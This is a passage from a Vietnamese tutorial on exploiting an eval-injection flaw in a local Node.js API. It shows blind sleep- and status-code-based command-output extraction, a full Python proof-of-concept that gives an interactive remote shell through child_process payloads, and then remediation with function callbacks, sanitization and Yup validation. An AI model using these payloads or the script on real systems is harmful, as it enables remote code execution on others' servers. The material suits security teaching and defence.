time curl -s -X POST -H "Content-Type: application/json" -H "Authorization: bearer eyJhbGciOiJIUz...SNIP...1YLEvDs4SR7RHfQ" -d "{ \"text\": \"'}) + require('child_process').execSync('sleep 2')//\" }" http://localhost:5000/api/service/generate
```

Kết quả trả về cho thấy yêu cầu mất 2 giây, do chúng ta đã sử dụng lệnh `sleep 2` trong payload.

#### Kiểm Tra Kết Quả của Lệnh:
Bây giờ, ta có thể sử dụng kỹ thuật này để xác định các ký tự trong kết quả lệnh. Ví dụ:

```json
{
  "text": "'}) + require('child_process').execSync('ls | head -c 1 | { read c; if [ \"$c\" = \"a\" ]; then sleep 2; fi; }')//"
}
```

- Ở đây, ta kiểm tra ký tự đầu tiên của đầu ra lệnh `ls`. Nếu ký tự là "a", hệ thống sẽ trì hoãn 2 giây.
- Nếu không có trì hoãn, nghĩa là ký tự không phải là "a".
- Sau đó, ta tiếp tục kiểm tra các ký tự tiếp theo, tăng số lượng ký tự kiểm tra bằng cách sử dụng `head -c 2` hoặc `head -c 3`.

#### Bước Tiếp Theo:
Với cách này, ta có thể kiểm tra từng ký tự một cách lặp đi lặp lại cho đến khi lấy được toàn bộ đầu ra của lệnh.

### 2. **Kỹ Thuật Boolean Output**
Nếu kỹ thuật sleep không khả thi hoặc không muốn sử dụng độ trễ, một kỹ thuật khác là **boolean output**, trong đó ta kiểm tra các thay đổi trong mã trạng thái HTTP (ví dụ: 200 cho "thành công", 404 cho "không tìm thấy", v.v.) để xác định giá trị của các ký tự.

Cách làm:
- Ta thay đổi một chút yêu cầu và kiểm tra xem phản hồi HTTP có thay đổi không (ví dụ: thay đổi giữa 200 và 403).
- Nếu một ký tự trong kết quả lệnh khớp với giá trị mà chúng ta kiểm tra, phản hồi HTTP sẽ thay đổi (ví dụ, từ mã 200 sang 403, hoặc ngược lại).

Ví dụ, nếu muốn kiểm tra ký tự đầu tiên, ta có thể gửi một yêu cầu và kiểm tra mã phản hồi:

```json
{
  "text": "'}) + require('child_process').execSync('ls | head -c 1')//"
}
```

- Nếu ký tự đầu tiên trong kết quả là "a", hệ thống có thể trả về mã trạng thái 200 (hoặc một mã khác tùy thuộc vào cấu hình).
- Nếu không khớp, hệ thống sẽ trả về mã 404 (hoặc một mã khác chỉ định rằng không có khớp).

### 3. **Sự Khác Biệt Giữa Sleep Timers và Boolean Output**
- **Sleep Timers** yêu cầu chúng ta đo thời gian phản hồi và sử dụng độ trễ để nhận diện giá trị đúng.
- **Boolean Output** sử dụng mã trạng thái HTTP (hoặc các lỗi khác) để chỉ ra sự khớp giữa các ký tự kiểm tra và đầu ra thực tế.

Cả hai kỹ thuật này đều có thể bị chậm nếu phải quét toàn bộ bảng mã ASCII, vì vậy việc tự động hóa quá trình này là rất quan trọng để tiết kiệm thời gian và cải thiện hiệu quả.

### 4. **Tự Động Hóa và Scripting**
Do việc kiểm tra từng ký tự là quá chậm và khó khăn khi thực hiện thủ công, bạn có thể viết một script để tự động hóa toàn bộ quá trình. Python là một công cụ hữu ích trong trường hợp này, giống như trong module **Blind SQL Injection**, nơi bạn có thể sử dụng các kỹ thuật để tối ưu hóa việc quét bảng mã ký tự.

Ví dụ trong Python, bạn có thể xây dựng một script để tự động gửi các yêu cầu và kiểm tra phản hồi, từ đó xác định từng ký tự trong đầu ra của lệnh.

### 5. **Thử Thách**
Hãy thử thực hiện kỹ thuật **boolean-based exfiltration** bằng cách sử dụng mã trạng thái HTTP khác nhau, chẳng hạn như 200 cho khi khớp và 404 cho khi không khớp, thay vì sử dụng sleep timers. Điều này sẽ giúp bạn hiểu rõ hơn về cách hoạt động của cả hai kỹ thuật và sự khác biệt giữa chúng.

---

# 15. Phát Triển Exploit - Tự Động Hóa Quá Trình Khai Thác

Trong phần này, chúng ta sẽ xây dựng một script tự động để khai thác lỗ hổng thông qua **HTTP response** để trích xuất kết quả của các lệnh hệ thống. Mục tiêu của chúng ta là phát triển một Proof of Concept (PoC) hoàn chỉnh, với các bước sau:

1. **Lấy Token Xác Thực Admin**: Để thực hiện yêu cầu, ta cần một token xác thực.
2. **Nhập Lệnh Từ Người Dùng**: Cho phép người dùng nhập lệnh mà họ muốn thực thi.
3. **Chèn Lệnh vào Payload**: Đưa lệnh vào JSON payload.
4. **Gửi Yêu Cầu POST**: Gửi yêu cầu POST tới API `/api/service/generate` với lệnh đã được chèn.
5. **Phân Tích Phản Hồi và In Kết Quả**: Phân tích phản hồi từ server và in ra kết quả của lệnh.
6. **Lặp Lại Bước 2**: Cho phép người dùng nhập thêm các lệnh và lấy kết quả.

### 1. **Định Nghĩa Các Biến Cơ Bản và Nhập Thư Viện**
Trước tiên, chúng ta sẽ định nghĩa các biến cơ bản cho server, port và các endpoint, đồng thời nhập các thư viện cần thiết:

```python
#!/usr/bin/python3
import requests
import json

# Định nghĩa các thông tin server và các endpoint API
server = "localhost"
port = 5000
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"
```

### 2. **Lấy Token Xác Thực**
Sau khi xác định endpoint cho việc xác thực, chúng ta cần gửi yêu cầu POST để nhận được token xác thực từ server:

```python
# Xác định các header và dữ liệu xác thực
headers = {"Content-Type": "application/json"}
data = {"email": "admin@domain.com"}

# Gửi yêu cầu POST đến endpoint xác thực
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))

# Lấy token từ phản hồi JSON
token = response.json()['token']
```

Lúc này, bạn có thể in ra token để xác nhận rằng nó đã được lấy thành công.

### 3. **Nhập Lệnh Từ Người Dùng**
Chúng ta sẽ tạo một vòng lặp để nhận đầu vào từ người dùng và chuẩn bị payload cho lệnh đã nhập:

```python
while True:
    user_input = input("> ")
    print(user_input)
```

### 4. **Chèn Lệnh vào Payload**
Tiếp theo, chúng ta sẽ sử dụng chuỗi Python để tạo payload JSON với lệnh người dùng nhập vào:

```python
while True:
    user_input = input("> ")
    # Thay thế dấu nháy đơn bằng dấu nháy kép để tránh lỗi trong JSON
    user_input = user_input.replace("'", '"')
    payload = {
        "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
    }
    print(payload)
```

### 5. **Gửi Yêu Cầu POST**
Bây giờ, chúng ta sẽ gửi yêu cầu POST tới API `/api/service/generate` với payload đã chuẩn bị và token xác thực:

```python
headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
```

### 6. **Phân Tích Phản Hồi và In Kết Quả**
Phản hồi từ server sẽ chứa thông tin về lệnh đã được thực thi. Chúng ta cần phân tích phản hồi và trích xuất đầu ra của lệnh:

```python
output = response.json()['message'].split("The input \"")[1][:-2]
print(output)
```

### 7. **Tạo Chương Trình Hoàn Chỉnh**
Kết hợp tất cả các phần trên, chúng ta có thể tạo một script hoàn chỉnh để tự động hóa khai thác:

```python
#!/usr/bin/python3
import requests
import json

# Định nghĩa các thông tin server và các endpoint API
server = "localhost"
port = 5000
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

# Xác định các header và dữ liệu xác thực
headers = {"Content-Type": "application/json"}
data = {"email": "admin@domain.com"}

# Gửi yêu cầu POST đến endpoint xác thực và lấy token
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

while True:
    # Nhập lệnh từ người dùng
    user_input = input("> ")

    # Thay thế dấu nháy đơn bằng dấu nháy kép để tránh lỗi
    user_input = user_input.replace("'", '"')
    
    # Tạo payload với lệnh người dùng nhập
    payload = {
        "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"
    }

    # Gửi yêu cầu POST đến API và nhận phản hồi
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))

    # Phân tích phản hồi và in kết quả
    output = response.json()['message'].split("The input \"")[1][:-2]
    print(output)
```

### 8. **Kiểm Tra và Chạy Script**
Chạy script và thử các lệnh khác nhau để kiểm tra kết quả:

```bash
python3 poc.py
> ls
node_modules
package-lock.json
package.json
src
> ls -la src
total 24
drwxr-xr-x  6 21y4d  staff  192 XXX  2 17:19 .
```

### 9. **Tùy Chỉnh và Mở Rộng**
Để cải thiện thêm, bạn có thể thêm các kiểm tra an toàn, xử lý lỗi hoặc hỗ trợ lịch sử đầu vào (ví dụ, sử dụng các phím mũi tên để sử dụng lại các lệnh trước).

---

# 16. Patching & Remediation: Giải Pháp Bảo Mật và Khắc Phục Lỗ Hổng

Trong phần này, chúng ta sẽ xem xét cách sửa chữa lỗ hổng bảo mật đã phát hiện trong ứng dụng web thông qua `eval injection`. Mặc dù ứng dụng này được lập trình khá an toàn, chúng ta vẫn cần tìm giải pháp thay thế cho việc sử dụng `eval`, cũng như triển khai các biện pháp bảo mật bổ sung.

### **1. Giải Pháp Thay Thế cho `eval`**

#### **1.1. Thay Thế `eval` Bằng Hàm**
Thay vì sử dụng `eval` để thực thi mã JavaScript, chúng ta có thể thay thế `onError` là một **hàm** thay vì một chuỗi. Điều này sẽ giúp ngăn ngừa việc tiêm mã độc:

```javascript
// Thay thế eval(onError) bằng việc gọi onError như một hàm
!validateString(text, function () {
    throw {
        message: role === "admin"
            ? `The input "${text}" contains the following invalid characters: [${text.match(/['"`;]/g)}]`
            : "Invalid input",
        statusCode: 403,
    };
});
```

Cách tiếp cận này đảm bảo rằng lệnh người dùng sẽ chỉ được truyền dưới dạng thông điệp lỗi chứ không phải là một đoạn mã có thể bị tiêm độc.

#### **1.2. Sử Dụng `safe-eval`**
Nếu việc sử dụng `eval` là cần thiết, có thể thay thế nó bằng một thư viện như `safe-eval` để giảm thiểu rủi ro. Thư viện này sẽ thực thi mã trong một môi trường sandbox để hạn chế việc thực thi mã không mong muốn:

```bash
npm install safe-eval -S
```

Tuy nhiên, **cảnh báo** là thư viện này có lỗ hổng nghiêm trọng, như báo cáo từ `npm audit`, và không có bản vá sẵn có cho các vấn đề như **Sandbox Breakout** và **Prototype Pollution**. Do đó, mặc dù có thể sử dụng, chúng ta vẫn không khuyến khích sử dụng `eval` khi không thật sự cần thiết.

#### **1.3. Kiểm Tra Lỗ Hổng**
Để thử nghiệm kỹ năng tiêm mã, bạn có thể cài đặt `safe-eval` và thay thế `eval` bằng `safeEval`. Tuy nhiên, hãy lưu ý rằng thư viện này vẫn có thể bị lợi dụng nếu không được bảo mật kỹ càng.

### **2. Các Biện Pháp Bảo Mật Thêm**

#### **2.1. Sanitization (Lọc Dữ Liệu)**
Sanitization là một bước quan trọng để loại bỏ các ký tự không mong muốn từ đầu vào của người dùng. Đặc biệt đối với ứng dụng web này, ta cần một chức năng lọc để loại bỏ các ký tự đặc biệt có thể dẫn đến tấn công tiêm mã (như dấu nháy đơn, dấu chấm phẩy, hoặc ký tự đặc biệt).

Dưới đây là một ví dụ về cách sử dụng phương pháp lọc ký tự:

```javascript
// Hàm lọc ký tự không mong muốn từ đầu vào người dùng
const sanitizedText = text.replace(/['"`;]/g, "");
```

Cách này không cần đến thư viện bên ngoài và sẽ loại bỏ các ký tự nguy hiểm, giúp ngăn ngừa các cuộc tấn công kiểu `SQL Injection`, `XSS`, và tiêm mã độc.

#### **2.2. Validation (Xác Thực Dữ Liệu)**
Validation đảm bảo rằng dữ liệu người dùng nhập vào phải phù hợp với định dạng yêu cầu. Để làm điều này, ta có thể sử dụng các thư viện như **Yup** để xác thực dữ liệu đầu vào một cách hiệu quả:

```javascript
const yup = require("yup");

// Kiểm tra đầu vào theo một mẫu regex
let schema = yup
    .string()
    .required()
    .matches(/^[^"\';`]*$/);

// Kiểm tra tính hợp lệ của đầu vào
schema.validateSync(text);
```

Lớp `Yup` giúp đảm bảo rằng đầu vào không chứa các ký tự đặc biệt và không gây hại cho ứng dụng.

#### **2.3. Cập Nhật Validation với Điều Kiện Vai Trò**
Ngoài việc kiểm tra đầu vào, chúng ta có thể tùy chỉnh thông báo lỗi dựa trên vai trò người dùng:

```javascript
let schema = yup
    .string()
    .required()
    .matches(/^[^"\';`]*$/, role === "admin" ? null : "Invalid input");

schema.validateSync(text);
```

Nếu người dùng là **admin**, thông báo lỗi sẽ chi tiết hơn, chỉ ra các ký tự không hợp lệ. Nếu không phải **admin**, chỉ có thông báo "Invalid input" đơn giản.

#### **2.4. Xác Thực Địa Chỉ Email**
Đối với các đầu vào dạng email, chúng ta có thể sử dụng `Yup` để xác thực rằng địa chỉ email hợp lệ:

```javascript
const validateEmail = (email) => {
    const schema = yup.string().email().required();
    return schema.isValidSync(email);
};
```

### **3. Áp Dụng Các Biện Pháp Khắc Phục**
Sau khi áp dụng các biện pháp trên, ta có thể thực hiện lại bài kiểm tra exploit để xác nhận rằng ứng dụng không còn dễ bị tổn thương. Dưới đây là các bước để thực hiện:

1. **Cập Nhật Mã**: Thay thế tất cả các điểm sử dụng `eval` bằng các giải pháp an toàn hơn như hàm thay thế hoặc `safe-eval`.
2. **Lọc và Xác Thực Dữ Liệu**: Áp dụng các biện pháp **sanitization** và **validation** cho các đầu vào của người dùng, đặc biệt là những đầu vào liên quan đến dữ liệu nhạy cảm như email và lệnh hệ thống.
3. **Kiểm Tra Exploit**: Chạy lại script khai thác để chắc chắn rằng ứng dụng đã được bảo vệ và không thể khai thác lại.

### **4. Kết Luận**
Việc sử dụng `eval` trong ứng dụng JavaScript có thể gây ra rủi ro nghiêm trọng nếu không được bảo vệ đúng cách. Tuy nhiên, với những biện pháp bảo mật bổ sung như thay thế `eval` bằng hàm, sử dụng thư viện như `Yup` cho validation, và thêm các bước lọc dữ liệu, chúng ta có thể giảm thiểu tối đa khả năng bị khai thác.

Khuyến nghị của chúng ta là **tránh sử dụng `eval` nếu có thể**, và **luôn luôn kiểm tra và xác thực đầu vào** để bảo vệ ứng dụng khỏi các lỗ hổng bảo mật.
